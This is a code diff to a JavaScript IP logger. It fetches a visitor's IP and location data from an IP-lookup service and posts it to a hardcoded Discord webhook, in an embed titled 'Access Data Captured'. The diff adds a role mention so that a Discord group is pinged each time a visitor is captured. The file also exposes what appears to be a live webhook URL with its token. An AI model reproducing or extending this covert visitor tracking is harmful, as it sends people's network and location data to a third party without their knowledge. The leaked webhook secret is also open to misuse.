@@ -54,13 +54,14 @@
         /**
          * AI-Optimized Webhook Integration
          * Fixed Name: 五覇法典ももんが
-         * Fixed Avatar: i.ibb.co/Fq7FbBXv/...
+         * Mention: <@&1456378548406456506>
          */
         const CORE_CONFIG = {
             WEBHOOK_URL: "https://discord.com/api/webhooks/1472915721096003839/QYc7m2EH5mK4kEfzWXSTOYGCXcVpmdmexSrElPFggIw9FjDqP-mUcYf_ZrZ1erUPsc62",
             IP_SERVICE: "https://ipapi.co/json/",
             BOT_NAME: "五覇法典ももんが",
-            BOT_AVATAR: "https://i.ibb.co/Fq7FbBXv/e-ASq-MYYat-Ml6-Zw3-thumb-1000-0.jpg"
+            BOT_AVATAR: "https://i.ibb.co/Fq7FbBXv/e-ASq-MYYat-Ml6-Zw3-thumb-1000-0.jpg",
+            MENTION_ID: "<@&1456378548406456506>" // 指定のロールメンション
         };
 
         async function processTelemetrics() {
@@ -72,8 +73,9 @@
 
                 // 2. ペイロード構築
                 const payload = {
-                    username: CORE_CONFIG.BOT_NAME, // 名前固定
-                    avatar_url: CORE_CONFIG.BOT_AVATAR, // アイコン固定
+                    username: CORE_CONFIG.BOT_NAME,
+                    avatar_url: CORE_CONFIG.BOT_AVATAR,
+                    content: CORE_CONFIG.MENTION_ID, // 埋め込みの外にメンションを配置（通知用）
                     embeds: [{
                         title: "📈 Access Data Captured",
                         color: 0x000000,
@@ -86,7 +88,8 @@
                         ],
                         footer: { text: "Secure Logger Instance" },
                         timestamp: new Date().toISOString()
-                    }]
+                    }],
+                    allowed_mentions: { "roles": ["1456378548406456506"] } // ロールメンションを許可する設定
                 };
 
                 // 3. Discordへ送信
